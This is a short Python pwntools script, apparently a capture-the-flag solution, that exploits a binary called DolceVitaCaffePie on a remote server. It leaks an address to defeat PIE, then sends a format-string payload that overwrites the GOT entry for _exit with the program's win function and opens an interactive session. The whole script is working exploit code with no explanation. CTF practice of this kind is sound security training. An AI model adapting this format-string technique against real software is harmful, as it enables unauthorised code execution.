from pwn import *

context.binary = elf = ELF('./DolceVitaCaffePie')

offStr = 10

#p = elf.process()
#gdb.attach(p)
p = remote('92.246.89.201', 10002)

p.sendlineafter(b']: ', b'y')

l = p.recvuntilS('.......................')
freeLeek = p.recvuntilS('.00€\n')
freeLeek = freeLeek.replace('.00€\n','')


elf.address = int(freeLeek) - elf.sym.main
print(hex(elf.address))
p.sendlineafter(b']: ', b'y')
p.sendlineafter(b']: ', b'y')



pyl = fmtstr_payload(10,{elf.got._exit:elf.sym.win})

print(len(pyl))

p.sendlineafter(b'> ', pyl)
p.interactive()
